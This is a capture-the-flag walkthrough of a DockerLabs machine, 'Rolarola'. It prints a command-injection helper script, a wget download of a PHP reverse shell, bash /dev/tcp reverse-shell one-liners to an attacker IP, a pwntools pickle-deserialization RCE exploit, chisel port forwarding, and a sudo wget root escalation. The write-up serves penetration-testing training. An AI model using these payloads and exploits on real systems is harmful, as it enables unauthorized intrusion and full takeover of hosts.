![Screenshot](/medium/Rolarola/Images/machine.png)

Difficuly: **medium**

Made by: **maciiii____**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* ⤵️  [Lateral Movement](#lateral-movement)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Command Injection, Extracting a repository .git, Port Forwarding, make exploit with pwntools, escalate privileges with Wget

---

First of all we make sure the machine is up, we can do this with the command **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.158 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.138 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.135 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.135/0.143/0.158/0.010 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We start first with **nmap** to know what ports are open in the target machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 00:55 -0500
Initiating ARP Ping Scan at 00:55
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:55, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:55
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:55, 3.23s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2026-01-05 00:55:05 -05 for 3s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see that the port 80 is open, so let's make another scan to know what services and versions are running in this port.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ nmap -p80 -sCV 172.17.0.2 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 00:57 -0500
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.66 ((Unix))
|_http-server-header: Apache/2.4.66 (Unix)
|_http-title: Mi primer web
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

**-p80** <- With this argument nmap will only scan this port that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

We can see that is a website, we can use **whatweb** to know what technologies uses this website:

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.66 (Unix)], IP[172.17.0.2], PHP[8.5.1], Script, Title[Mi primer web], X-Powered-By[PHP/8.5.1]
```

We can see that uses **php**, but let's take a look into the website with our browser.

![Screenshot](/medium/Rolarola/Images/image1.png)

And we can see this, we can see that we can type a name, so let's do it and see what happens.

![Screenshot](/medium/Rolarola/Images/image2.png)

we can see that it seems that our name has been saved somewhere, so let's make a little bit of enumeration.

---
# Enumeration

Let's use **gobuster** to find possible directories and another files.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 483]
/names.txt            (Status: 200) [Size: 6]
```

We can see that we find a file **names.txt** so let's take a look with **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
```

It seems that add our names into this file, let's add a name for example **leon**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
```

Also leon is added into this file, we can try to send payloads so see if is a sqli, command injection, ldap, etc...

After a little bit of trying we can find something interesting when we add **;id**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
```

it seems we can execute code, I can try to execute a command if we can see the passwd file.

**;cat /etc/passwd**

```lua
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
apache:x:100:101:apache:/var/www:/sbin/nologin
matsi:x:1000:1000::/home/matsi:/bin/bash
```

And yes, we can see that we can execute code, so i'm going to make a python script to send commands more easily.

---
# Exploitation

We need to know how the data is sending so i'm going to take a look into the source code of the website.

```html
<form method="POST">
	<input type="text" name="nombre" placeholder="Escribe tu nombre" required>
	<button type="submit">Enviar</button>
</form>
```

We can see that the parameter **nombre** is making a **POST** request that it seems to the root directory **/**

Okay so with this i'm going to make then the python script.

```python
import requests, sys, signal

def stop(sig, frame):
    print("\n\n[!] QUITTING...")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def send_request(payload):
    target = "http://172.17.0.2"

    fun = {
        "nombre": f";{payload}"
    }

    requests.post(url=target, data=fun)

    output = requests.get(url=target+"/names.txt")

    lines = output.text.strip().splitlines()[-10:]

    for line in lines: print(line)

def execute():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send_request(cmd)

if __name__ == "__main__":
    execute()
```

so with this python script when we execute a command the output only will show us 10 lines from the end.

Okay so let's make use of it.

```r
[*] CMD -> ls -la
ff02::2 ip6-allrouters
172.17.0.2      46743728d906
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
total 32
drwxr-xr-x    1 apache   apache        4096 Dec 29 05:37 .
drwxr-xr-x    1 root     root          4096 Dec 29 05:18 ..
-rw-r--r--    1 apache   apache         949 Dec 29 05:51 index.php
-rw-r--r--    1 apache   apache        1224 Jan  5 07:02 names.txt
-rw-r--r--    1 apache   apache         153 Dec 29 05:44 script.js
-rw-r--r--    1 apache   apache         360 Dec 29 05:45 style.css
```


It seems we are inside of the directory from the website, let's try to make a reverse shell.

But first let's be in listen mode with **netcat** to receive the shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay let's execute the command then.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ rlwrap python3 commands.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/1234 0>&1'
```

But we don't receive nothing, after trying with multiple payloads for some reason don't receive anything, probably there is rules from a firewall.

Then let's use a file with php from **pentestmonkey**, let's transfer this file, but first let's check if it have **wget** or **curl**.

```r
[*] CMD -> which wget
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
```

we can see that exist **wget**, so let's make a python server from our attack machine, to transfer this file with **wget**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Okay then with our python script let's download our php file, in my case is **reverse.php**.

```r
[*] CMD -> wget http://192.168.0.20/reverse.php
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
```

And we receive this in our server.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [05/Jan/2026 15:41:31] "GET /reverse.php HTTP/1.1" 200 -
```

We can see that the transfer was successful.

```r
[*] CMD -> ls -la
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
total 36
drwxr-xr-x    1 apache   apache        4096 Jan  5 20:41 .
drwxr-xr-x    1 root     root          4096 Dec 29 05:18 ..
-rw-r--r--    1 apache   apache         949 Dec 29 05:51 index.php
-rw-r--r--    1 apache   apache          90 Jan  5 20:39 names.txt
-rw-r--r--    1 apache   apache        2147 Jan  5 20:39 reverse.php
-rw-r--r--    1 apache   apache         153 Dec 29 05:44 script.js
-rw-r--r--    1 apache   apache         360 Dec 29 05:45 style.css
```

And we can see that is saved in the same directory let's once again be in listen mode with **netcat** to receive the shell.

And then let's execute it with our tool.

```r
[*] CMD -> php reverse.php
```

And we receive this:

```java
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 44628
Linux 9de7c43b90a1 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64 Linux
sh: w: not found
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
bash: cannot set terminal process group (11): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
9de7c43b90a1:/$
```

### Modify shell

So let's modify this shell because is very ugly, let's do a quick treatment then.

First of all we do this:

Since in this system the command **script** doesn't exist let's spawn a shell with **python3** and **pty**

```r
9de7c43b90a1:/$ which python3
which python3
/usr/bin/python3
```

We can see that exists python3, then let's spawn the shell with this.

```r
9de7c43b90a1:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
```

once we do this, let's suspend the process first with **CTRL + Z**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
9de7c43b90a1:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
9de7c43b90a1:/$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Lateral Movement

After a lot of tries with trying to escalate privileges, we can find that exists something interesting in the directory **/opt/**

```r
9de7c43b90a1:/$ ls -la opt
total 12
drwxr-xr-x    1 root     root          4096 Dec 29 06:56 .
drwxr-xr-x    1 root     root          4096 Jan  5 20:13 ..
drwxr-sr-x    7 root     root          4096 Dec 29 06:56 .git
```

We find a git repository, let's transfer it, we can use **python3** to make a server and get the git project with **wget** to our attack machine.

```r
9de7c43b90a1:/opt$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Then in our attack machine let's get all the content.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ wget -r http://172.17.0.2:100/.git
```

Let's download all the content recursively.

After download all the content in our attack machine we can see a directory.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ ls
172.17.0.2:100  reverse.php
```

then let's get in.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ ls -la
total 12
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 .
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 ..
drwxrwxr-x 7 craft craft 4096 Jan  5 16:04 .git
```

We can see all the content from the **git** project, with the command **tree**.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ tree .git
.git
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── hooks
│   ├── applypatch-msg.sample
│   ├── commit-msg.sample
│   ├── index.html
│   ├── post-update.sample
│   ├── pre-applypatch.sample
│   ├── pre-commit.sample
│   ├── pre-merge-commit.sample
│   ├── prepare-commit-msg.sample
│   ├── pre-push.sample
│   ├── pre-rebase.sample
│   ├── pre-receive.sample
│   ├── push-to-checkout.sample
│   ├── sendemail-validate.sample
│   └── update.sample
├── index
├── info
│   ├── exclude
│   └── index.html
├── logs
│   ├── HEAD
│   ├── index.html
│   └── refs
│       ├── heads
│       │   ├── index.html
│       │   └── master
│       └── index.html
├── objects
│   ├── 11
│   │   ├── 9ed670ec345e6e9fa326a239b77b5ea81b11ba
│   │   └── index.html
│   ├── 39
│   │   ├── ccbfaa621474cdc8d1d007155244857cc6dbcc
│   │   └── index.html
│   ├── 9b
│   │   ├── e990f357a50a12ace9acc44a0d247edacd4702
│   │   └── index.html
│   ├── c5
│   │   ├── f76de56103094eb006e176840546c4f7ad4f9e
│   │   └── index.html
│   ├── index.html
│   ├── info
│   │   └── index.html
│   └── pack
│       └── index.html
└── refs
    ├── heads
    │   ├── index.html
    │   └── master
    ├── index.html
    └── tags
        └── index.html

16 directories, 41 files
```

It seems that we all the content.

We can try to see the logs of the git project with **git log**

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git log
commit 119ed670ec345e6e9fa326a239b77b5ea81b11ba (HEAD -> master)
Author: matsi <matsi@chain.dl>
Date:   Mon Dec 29 06:55:45 2025 +0000

    Mi primer commit?
```

We can see a commit, and also a message, we can take a look what changes are made with this with ```git checkout <commit>```

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git checkout 119ed670ec345e6e9fa326a239b77b5ea81b11ba
D       app.py
D       objetivos.bin
Note: switching to '119ed670ec345e6e9fa326a239b77b5ea81b11ba'.
```

We can see that 2 files has been deleted, **app.py** and **objetivos .py**

To recover those files we can execute the next command: ```git reset --hard <commit>``` But a warning with this command is that when we recover all of that, we do it **permanently**.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git reset --hard 119ed670ec345e6e9fa326a239b77b5ea81b11ba
HEAD is now at 119ed67 Mi primer commit?
```

Now if we see the current directory now it contains the python script and the bin file.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ ls
app.py  objetivos.bin
```

Taking a quick look into the python script we can see this:

```python
import socket
import pickle
import os

HOST = "127.0.0.1"
PORT = 6969
DATA_FILE = "objetivos.bin"
```


We can see this it seems that this script is being executed in the target machine, let's take a look if is being executed, we can check with **netstat**

```r
9de7c43b90a1:/opt$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 127.0.0.1:6969          0.0.0.0:*               LISTEN      
tcp        0    137 172.17.0.2:58600        192.168.0.20:1234       ESTABLISHED 
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        1      0 ::ffff:172.17.0.2:80    ::ffff:172.17.0.1:56518 CLOSE_WAIT  
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ]         DGRAM                     18939
```

We can see that is being executed on the target machine, but before doing that, let's analyse a little bit the python script.

And we can see 2 important functions on the script, and this is vulnerable to a **RCE**.

```python
def guardar_objetivo(blob):
    with open(DATA_FILE, "ab") as f:
        size = len(blob).to_bytes(4, "big")
        f.write(size + blob)   # guarda RAW, no pickle
```

With this function is saving crude data to the **DATA_FILE** (objetivos.bin) this is very important to know.

```python
def leer_objetivos():
    objetivos = []

    if not os.path.exists(DATA_FILE):
        return objetivos

    with open(DATA_FILE, "rb") as f:
        while True:
            size_bytes = f.read(4)
            if not size_bytes:
                break

            size = int.from_bytes(size_bytes, "big")
            data = f.read(size)

            objetivos.append(pickle.loads(data)) # VULNERABLE

    return objetivos
```

And this function is very weak, because it uses **pickle** to load data, this is very bad, because we can execute commands from here, and how it works?

It's a bit way hard to explain, we need to talk about how python really works with serialised objects, a little bit of low level and all of that.

If you want to know more about all of this and why pickle is a bad idea to use, you can take a look [here](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

In resume when we **serialise** data with the format pickle, is working with bytes and when we **deserialise** is like recovering once again the info, but when pickle desarialise is executing byte by byte as soon when pickle does it.

Example:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

This is like format pickle.

To deserialise it we need to load that string of bytes, and we can see that the info is recovered.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```


We can recover the information, and you can see why this is vulnerable, we can make a payload that instead of doing all of this we can try to import the **os** library and execute arbitrary code.

So im going to make a python script to make this all for us.

So i'm going to make a diagram with **excalidraw** how the python script vulnerable works.

![Screenshot](/medium/Rolarola/Images/image3.png)

I hope that you can understand it, so im going to make the exploit with my own machine taking advantage that we have the **app.py** with us.

Im going to use pwntools to send the data and the payload, and connect to the target.

```python
from pwn import *
import signal, time, pickle, os

target = "127.0.0.1"
port = 6969

def stop(sig, frame):
    print()
    log.warn("QUITTING...")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def send(payload):
    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    malicious = pickle.dumps(RCE())

    connect = remote(target, port)

    connect.sendlineafter(b"> ", b"2")
    connect.sendafter(b"Nombre: ", b"pwned")
    connect.sendafter(b"Edad: ", b"999")

    connect.sendafter(b"Objetivo: ", malicious)

    connect.close()

    launch = remote(target, port)

    launch.sendlineafter(b"> ", b"1")
    print()
    log.warn("PAYLOAD EXECUTED")

    time.sleep(0.5)
    launch.close()

def execute():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send(cmd)

if __name__ == "__main__":
    execute()
```

Okay so with my own machine let's execute the **app.py** and then execute our own exploit.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
```

Now let's execute our own exploit, and send a command.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ python3 exploit.py 

[*] CMD -> id
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

And with the python server we can see this:

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
```

It works! let's do it again.

```r
[*] CMD -> ls -la
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

And in our server we can see this:

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
total 20
drwxrwxr-x 3 craft craft 4096 Jan  5 17:49 .
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 ..
-rw-rw-r-- 1 craft craft 1854 Jan  5 16:23 app.py
drwxrwxr-x 7 craft craft 4096 Jan  5 16:23 .git
-rw-rw-r-- 1 craft craft   92 Jan  5 17:51 objetivos.bin
```

So our exploit works!

Then let's get the port 6969 from the target machine, in resume port forwarding.

To get the port we need to use **chisel**, because the port only is in listen mode from the target machine, his **localhost**.

First let's copy **chisel** to our current working directory.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ cp /usr/bin/chisel .
```

Then let's make a python server to download chisel from the target machine with wget.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then in the target machine let's download it, for example in the **/tmp/** directory.

```r
9de7c43b90a1:/tmp$ wget http://192.168.0.20/chisel
--2026-01-05 23:02:30--  http://192.168.0.20/chisel
Connecting to 192.168.0.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240184 (9.8M) [application/octet-stream]
Saving to: 'chisel'

chisel    100%[====================>]   9.77M  --.-KB/s    in 0.04s   

2026-01-05 23:02:31 (223 MB/s) - 'chisel' saved [10240184/10240184]
```

Then let's give them permissions of executable with **chmod**

```r
9de7c43b90a1:/tmp$ chmod +x chisel
```

Now in our attack machine let's make a **chisel** server to receive connections.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ chisel server --reverse -p 1000
2026/01/05 18:06:59 server: Reverse tunnelling enabled
2026/01/05 18:06:59 server: Fingerprint 7n19TgnLTOHeaNjkp/cQxWzbENa4Awr+430bnIyaGRo=
2026/01/05 18:06:59 server: Listening on http://0.0.0.0:1000
```

Now let's get the port 6969 from the target machine with chisel.

```r
9de7c43b90a1:/tmp$ ./chisel client 192.168.0.20:1000 R:6969:127.0.0.1:6969
2026/01/05 23:07:51 client: Connecting to ws://192.168.0.20:1000
2026/01/05 23:07:51 client: Connected (Latency 844.606µs)
```

Okay so with OUR port 6969 will be the localhost of the TARGET machine with his port 6969.

Now let's use our exploit to get a reverse shell to us with **netcat** from our attack machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Now let's use our own exploit to make a reverse shell!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ python3 exploit.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/2222 0>&1'
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

and we receive this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 43096
bash: cannot set terminal process group (18): Not a tty
bash: no job control in this shell
9de7c43b90a1:~$ whoami
whoami
matsi
```

Now we are the user **matsi**!

And again modify the shell to operate more comfy, like we did before [here](#modify-shell)

---
# Privilege Escalation

When execute **sudo -l** we have a privilege of **SUDOER**

```r
9de7c43b90a1:~$ sudo -l
Matching Defaults entries for matsi on 9de7c43b90a1:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for matsi:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User matsi may run the following commands on 9de7c43b90a1:
    (ALL : ALL) NOPASSWD: /usr/bin/wget
```

We can execute the command **wget** as **any** user even the user **root**.

Then we can get a little bit of **GTFOBins** to gain a shell as the user **root** we can do this with the next commands:

```c
9de7c43b90a1:~$ funny=$(mktemp)
9de7c43b90a1:~$ chmod +x $funny
9de7c43b90a1:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$funny
9de7c43b90a1:~$ sudo wget --use-askpass=$funny 0
Prepended http:// to '0'
/home/matsi # whoami
root
```

Now we are **root** ***...pwned..!***
